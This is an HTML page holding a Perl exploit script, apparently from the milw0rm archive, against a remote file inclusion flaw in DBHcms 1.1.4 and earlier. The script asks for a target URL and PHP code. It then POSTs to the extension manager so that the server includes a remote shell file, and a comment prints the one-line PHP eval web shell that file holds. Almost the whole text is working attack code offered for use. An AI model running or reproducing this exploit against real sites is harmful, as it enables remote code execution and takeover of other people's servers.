<html><head><title>DBHcms <= 1.1.4 Remote File Inclusion exploit</title></head><pre>#!/usr/bin/perl
#	DBHcms &lt;= 1.1.4 Remote File Inclusion exploit
#	Vendor url: www.drbenhur.com
#
# exploit is hard to execute through a browser -possible though- since it's with POST
#							~Iron
#							http://www.randombase.com
require LWP::UserAgent;
#Shell:
# &lt;?php if(!empty($_GET['do'])){eval($_GET['do']);}?&gt;
$shell_url = &quot;http://localhost/s.txt&quot;;

print &quot;#
#  DBHcms &lt;= 1.1.4 Remote File Inclusion exploit
# By Iron - randombase.com
# Greets to everyone at RootShell Security Group
#
# Example target url: http://www.target.com/dhbcms/
Target url?&quot;;
chomp($target=&lt;stdin&gt;);
if($target !~ /^http:\/\//)
{
	$target = &quot;http://&quot;.$target;
}
if($target !~ /\/$/)
{
	$target .= &quot;/&quot;;
}
print &quot;PHP code to evaluate? &quot;;
chomp($code=&lt;stdin&gt;);
$code =~ s/(&lt;\?php|\?&gt;|&lt;\?)//ig;
$target .= &quot;dbhcms/mod/mod.extmanager.php?do=&quot;.$code;

$ua = LWP::UserAgent-&gt;new;
$ua-&gt;timeout(10);
$ua-&gt;env_proxy;

$response = $ua-&gt;post($target,
{
'extmanager_install' =&gt; $shell_url.'?'
});

if ($response-&gt;is_success)
{
	print &quot;\n&quot;.&quot;#&quot; x 20 .&quot;\n&quot;;
	if($response-&gt;content =~ /URL file-access/)
	{
		print 'Exploit failed';
	}
	else
	{
		print $response-&gt;content;
	}
	print &quot;\n&quot;.&quot;#&quot; x 20 .&quot;\n&quot;;
}
else
{
 die &quot;Error: &quot;.$response-&gt;status_line;
}

# milw0rm.com [2008-02-25]</pre></html>